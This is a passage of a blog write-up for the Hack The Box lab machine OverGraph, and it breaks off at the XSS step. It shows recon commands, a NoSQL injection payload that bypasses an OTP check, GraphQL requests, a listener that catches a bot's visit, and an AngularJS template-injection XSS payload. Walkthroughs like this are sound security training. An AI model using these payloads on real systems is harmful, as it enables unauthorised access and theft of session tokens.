@@ -1,0 +1,912 @@
+<!doctype html><html lang=es><head><title>OverGraph | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Open Redirect, a web application built with AngularJS which is vulnerable to Client-Side Template Injection and XSS, and a GraphQL endpoint. We are able to register a new account bypassing an OTP code using a NoSQLi payload. Then, we can perform a CSRF attack abusing the Open Redirect to inject an XSS payload on the victim&rsquo;s profile in order to get an adminToken stored in localStorage. After that, we are able to upload video files that are processed with ffmpeg, so we can exploit a Server-Side Request Forgery vulnerability to read files from the server. Eventually, we will access as a user to the machine and find a binary that is running as root. Having analyzed the binary, we can obtain a valid token to use the program and exploit a vulnerability to write arbitrary data at an arbitrary address, leading to RCE or write permissions as root"><meta itemprop=description content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Open Redirect, a web application built with AngularJS which is vulnerable to Client-Side Template Injection and XSS, and a GraphQL endpoint. We are able to register a new account bypassing an OTP code using a NoSQLi payload. Then, we can perform a CSRF attack abusing the Open Redirect to inject an XSS payload on the victim&rsquo;s profile in order to get an adminToken stored in localStorage. After that, we are able to upload video files that are processed with ffmpeg, so we can exploit a Server-Side Request Forgery vulnerability to read files from the server. Eventually, we will access as a user to the machine and find a binary that is running as root. Having analyzed the binary, we can obtain a valid token to use the program and exploit a vulnerability to write arbitrary data at an arbitrary address, leading to RCE or write permissions as root"><meta name=twitter:description content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Open Redirect, a web application built with AngularJS which is vulnerable to Client-Side Template Injection and XSS, and a GraphQL endpoint. We are able to register a new account bypassing an OTP code using a NoSQLi payload. Then, we can perform a CSRF attack abusing the Open Redirect to inject an XSS payload on the victim&rsquo;s profile in order to get an adminToken stored in localStorage. After that, we are able to upload video files that are processed with ffmpeg, so we can exploit a Server-Side Request Forgery vulnerability to read files from the server. Eventually, we will access as a user to the machine and find a binary that is running as root. Having analyzed the binary, we can obtain a valid token to use the program and exploit a vulnerability to write arbitrary data at an arbitrary address, leading to RCE or write permissions as root"><meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Open Redirect, a web application built with AngularJS which is vulnerable to Client-Side Template Injection and XSS, and a GraphQL endpoint. We are able to register a new account bypassing an OTP code using a NoSQLi payload. Then, we can perform a CSRF attack abusing the Open Redirect to inject an XSS payload on the victim&rsquo;s profile in order to get an adminToken stored in localStorage. After that, we are able to upload video files that are processed with ffmpeg, so we can exploit a Server-Side Request Forgery vulnerability to read files from the server. Eventually, we will access as a user to the machine and find a binary that is running as root. Having analyzed the binary, we can obtain a valid token to use the program and exploit a vulnerability to write arbitrary data at an arbitrary address, leading to RCE or write permissions as root"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/OverGraph/OverGraph.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/OverGraph/OverGraph.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/OverGraph/OverGraph.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="OverGraph"><meta property="og:title" content="OverGraph"><meta property="og:url" content="https://7rocky.github.io/en/htb/overgraph/"><meta itemprop=keywords content="otp,graphql,angularjs,file-upload,open-redirect,port-forwarding,nosqli,binary-exploitation,xss,reversing,static-code-analysis,rce,directory-path-traversal,csrf,ssrf,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href=/htb/overgraph/ title=es><img alt=es height=30px src=/images/es.png style="border:4px solid#000;border-radius:100%" width=30px></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href title=en><img alt=en height=30px src=/images/en.png width=30px></a><ul class="pl0 ml3 mr3" style=line-height:30px><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/overgraph/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/overgraph/&text=OverGraph" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/overgraph/&title=OverGraph" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">OverGraph</h1><time class="f6 mv4 dib tracked" datetime=2022-08-06T00:00:00+01:00>06 / 08 / 2022</time></header><div class=htb-image><img alt=OverGraph src=/images/HTB/OverGraph/OverGraph.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/otp title=OTP>OTP</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/graphql title=GraphQL>GraphQL</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/angularjs title=AngularJS>AngularJS</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/file-upload title="File upload">File upload</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/open-redirect title="Open Redirect">Open Redirect</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/port-forwarding title="Port forwarding">Port forwarding</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/nosqli title="NoSQL Injection">NoSQL Injection</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/binary-exploitation title="Binary exploitation">Binary exploitation</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/xss title="Cross-Site Scripting">Cross-Site Scripting</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/reversing title="Reverse Engineering">Reverse Engineering</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/static-code-analysis title="Static Code Analysis">Static Code Analysis</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Code Execution">Remote Code Execution</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/directory-path-traversal title="Directory Path Traversal">Directory Path Traversal</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/csrf title="Cross-Site Request Forgery">Cross-Site Request Forgery</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/ssrf title="Server-Side Request Forgery">Server-Side Request Forgery</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#registering-a-new-account>Registering a new account</a></li><li><a href=#finding-vulnerabilities>Finding vulnerabilities</a></li><li><a href=#graphql-enumeration>GraphQL enumeration</a></li><li><a href=#exploit-to-get-admintoken>Exploit to get <code>adminToken</code></a></li><li><a href=#exploiting-the-video-file-upload>Exploiting the video file upload</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#analyzing-the-nreport-binary>Analyzing the <code>nreport</code> binary</a></li><li><a href=#planning-the-exploit>Planning the exploit</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Hard</li><li><strong>IP Address</strong>: 10.10.11.157</li><li><strong>Release</strong>: 30 / 04 / 2022</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.157 -p 22,80
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.157
+</span></span><span style=display:flex><span>Host is up (0.045s latency).
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA)
+</span></span><span style=display:flex><span>|   256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA)
+</span></span><span style=display:flex><span>|_  256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519)
+</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://graph.htb
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 7.99 seconds
+</span></span></code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.157</code> we are redirected to <code>http://graph.htb</code>. Hence, we must enter this domain in <code>/etc/hosts</code> to view the website:</p><p><img src=/images/HTB/OverGraph/OverGraph-index.png alt="OverGraph index"></p><p>If we inspect the source code, we can see some JavaScript code that perform a redirection if <code>redirect</code> is present as a query parameter. This might be useful later because it acts like an Open Redirect:</p><p><img src=/images/HTB/OverGraph/OverGraph-index-redirect.png alt="OverGraph index redirect"></p><p>For the moment, let&rsquo;s enumerate more subdomains using <code>ffuf</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.157 -H <span class=code-dark-yellow>'Host: FUZZ.graph.htb'</span> -fl 8  
+<span class=code-dark-green>internal                [Status: 200, Size: 607, Words: 36, Lines: 15, Duration: 49ms]</span>
+</code></pre></div><p>Alright, so let&rsquo;s add <code>internal.graph.htb</code> into <code>/etc/hosts</code> and see what we have:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-login.png alt="OverGraph internal login"></p><p>We have a login form. We can try default credentials, but they do not work. One thing to notice is that this web application is built with AngularJS. The <code>index.html</code> file only loads CSS and JavaScript files that will render the whole site:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-spa.png alt="OverGraph internal SPA"></p><p>This is a Single Page Application (SPA), so we can&rsquo;t enumerate available routes the usual way (with <code>ffuf</code>). However, we can read the main JavaScript file (<code>main.0681ef4e6f13e51b.js</code>) and extract some routes from there:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal.graph.htb/main.0681ef4e6f13e51b.js -s | <span class=code-dark-green>grep</span> -oE <span class=code-dark-yellow>"['<span class=code-dark-cyan>\"</span>]/.*?['<span class=code-dark-cyan>\"</span>]"</span> | <span class=code-dark-green>grep</span> -v <span class=code-dark-yellow>"['<span class=code-dark-cyan>\"</span>]/*['<span class=code-dark-cyan>\"</span>]"</span> | <span class=code-dark-green>sort</span> -u  
+"/("
+"/dashboard"
+"/g,'
+"/graphql"
+"/inbox"
+"/logout"
+"/profile"
+"/register"
+"/tasks"
+"/uploads"
+'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\"
+'/%3E%3Cpath d='
+'/%3E%3Cpath id='
+'/graphql'
+</code></pre></div><p>So, we have:</p><ul><li><code>/dashboard</code></li><li><code>/graphql</code></li><li><code>/inbox</code></li><li><code>/logout</code></li><li><code>/profile</code></li><li><code>/register</code></li><li><code>/tasks</code></li><li><code>/uploads</code></li></ul><p>Only the three last routes work. The other ones redirect to the login form, except for <code>/graphql</code> which expects a GraphQL query.</p><p>This is <code>/register</code>:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-register.png alt="OverGraph internal register"></p><p>This is <code>/tasks</code>:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-tasks.png alt="OverGraph internal tasks"></p><p>And this is <code>/uploads</code>:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-uploads.png alt="OverGraph internal uploads"></p><p>That video file upload seems interesting. Maybe it will be exploitable later.</p><h2 id=registering-a-new-account>Registering a new account</h2><p>For the moment, let&rsquo;s try to register a new account. We must add an email address that ends in <code>@graph.htb</code>:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-register-trial.png alt="OverGraph internal register trial"></p><p>And apparently, the server sent us an email with an OTP code, but we don&rsquo;t have such email address. Let&rsquo;s capture the request with Burp Suite:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-verify-burp.png alt="OverGraph internal verify Burp"></p><p>Alright, we have another subdomain called <code>internal-api.graph.htb</code>. If we try sending some OTP codes, the server will block us after 4 attempts. So the OTP code must not be the way.</p><p>In fact, if we analyze the JavaScript code (previously formatted with the browser debugger), we can search for <code>"register"</code> and discover how to register a new account, bypassing the OTP code:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-register-endpoint.png alt="OverGraph internal register endpoint"></p><p>So we only need to send a POST request to <code>internal-api.graph.htb/api/register</code> with our data. Like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/api/register -d <span class=code-dark-yellow>'{"email":"rocky@graph.htb","username":"rocky","password":"asdffdsa","confirmPassword":"asdffdsa"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>  
+{"result":"Invalid Email / Email not verified"}
+</code></pre></div><p>Ok, it won&rsquo;t be that easy. It seems that we need to verify the email account first. Taking a look at the request in Burp Suite, we see that the OTP code is sent in a JSON document as a string:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-otp-code.png alt="OverGraph internal OTP code"></p><p>We can try some injections and Type Juggling techniques. Eventually, we can try NoSQL injection payloads (taken from <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>PayloadsAllTheThings</a>) such as <code>{"$ne":"foo"}</code>, so that we bypass the checks if the server is vulnerable:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-otp-nosqli.png alt="OverGraph internal OTP NoSQLi"></p><p>And it is vulnerable. Now we have verified the email address and can register a new account:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/api/register -d <span class=code-dark-yellow>'{"email":"rocky@graph.htb","username":"rocky","password":"asdffdsa","confirmPassword":"asdffdsa"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>  
+{"result":"Account Created Please Login!"}
+</code></pre></div><p>At this point, we have access to <code>/dashboard</code> and <code>/profile</code>:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-dashboard.png alt="OverGraph internal dashboard"></p><p><img src=/images/HTB/OverGraph/OverGraph-internal-profile.png alt="OverGraph internal profile"></p><p>Moreover, we can see a message from Mark at <code>/inbox</code>:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-inbox.png alt="OverGraph internal inbox"></p><p><strong>Note:</strong> The machine restores the database every now and then, and also, the users that write messages are changing between Mark, Larry, Sally, Alen&mldr; From now on, I&rsquo;ll refer to other users as &ldquo;Mark&rdquo;.</p><p>If we inspect a bit more the web, we will notice that authentication is handled using JWT tokens:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-jwt.png alt="OverGraph internal JWT"></p><p>And also <code>localStorage</code>:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-localstorage.png alt="OverGraph internal localStorage"></p><h2 id=finding-vulnerabilities>Finding vulnerabilities</h2><p>If we modify the <code>admin</code> key to <code>"true"</code>, we will see the &ldquo;Uploads&rdquo; link at the left (although we already knew that the endpoint <code>/uploads</code> exists):</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-dashboard-admin.png alt="OverGraph internal dashboard admin"></p><p>Moreover, we know that Mark is a valid user, and indeed, if we change our <code>username</code> and <code>email</code> keys accordingly, we will enter in Mark&rsquo;s session:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-dashboard-mark.png alt="OverGraph internal dashboard Mark"></p><p>Thinking in the video file upload, in order to upload files to the server, we will need an <code>adminToken</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/admin/video/upload -d <span class=code-dark-yellow>''</span>  
+{"result": "No adminToken header present"}
+</code></pre></div><p>As Mark&rsquo;s message says, we might try to send an URL as a message and see if someone goes to that URL. The chat is a bit broken, so in order to send messages, we can click the button using the JavaScript console:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-chat-button.png alt="OverGraph internal chat button"></p><p>Another way is inspecting the request in the browser and copying it as a <code>curl</code> command. Something like this (the error does not matter):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/graphql -d <span class=code-dark-yellow>'{"variables":{"to":"mark@graph.htb","text":"asdf"},"query":"mutation ($to: String!, $text: String!) { sendMessage(to: $to, text: $text) { toUserName fromUserName text to from __typename } }"}'</span> -H <span class=code-dark-yellow>'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>  
+{"errors":[{"message":"Cannot read property 'length' of null","locations":[{"line":1,"column":43}],"path":["sendMessage"],"extensions":{"code":"INTERNAL_SERVER_ERROR","exception":{"stacktrace":["TypeError: Cannot read property 'length' of null","    at sendMessage (/home/user/onegraph/backend/graphql/resolvers/message.js:47:56)","    at processTicksAndRejections (internal/process/task_queues.js:95:5)"]}}}],"data":null}
+</code></pre></div><p>And so, we can send a message with our IP as URL, so that Mark performs a GET request (we can also test for HTML injection to see if we can get XSS easily, but it is not possible):</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-dashboard-mark-url.png alt="OverGraph internal dashboard Mark URL"></p><p>And indeed, Mark accesses the URL and we receive the request:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 80
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.157.
+Ncat: Connection from 10.10.11.157:38078.
+GET / HTTP/1.1
+Host: 10.10.17.44
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Chrome/77
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+</code></pre></div><p>At this point, we can think of ways to get <code>adminToken</code>. Assuming that <code>adminToken</code> is stored as a cookie or as a key in <code>localStorage</code>, eventually we will need to trigger Cross-Site Scripting (XSS) on the victim&rsquo;s browser so that we can take the value and send it to us somehow.</p><p>Since the web application is built with AngularJS (also known as Angular 1), it is very old and known to be vulnerable to Client-Site Template Injection (which derives in XSS).</p><p>The injection comes into place in the <code>firstname</code> and <code>lastname</code>. Here&rsquo;s a simple proof of concept:</p><p><img src=/images/HTB/OverGraph/OverGraph-internal-dashboard-csti.png alt="OverGraph internal dashboard CSTI"></p><p>And we can transform it to XSS using the payload below (more information in <a href=https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs>portswigger.net</a>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>{{constructor.constructor(&#39;alert(123)&#39;)()}}
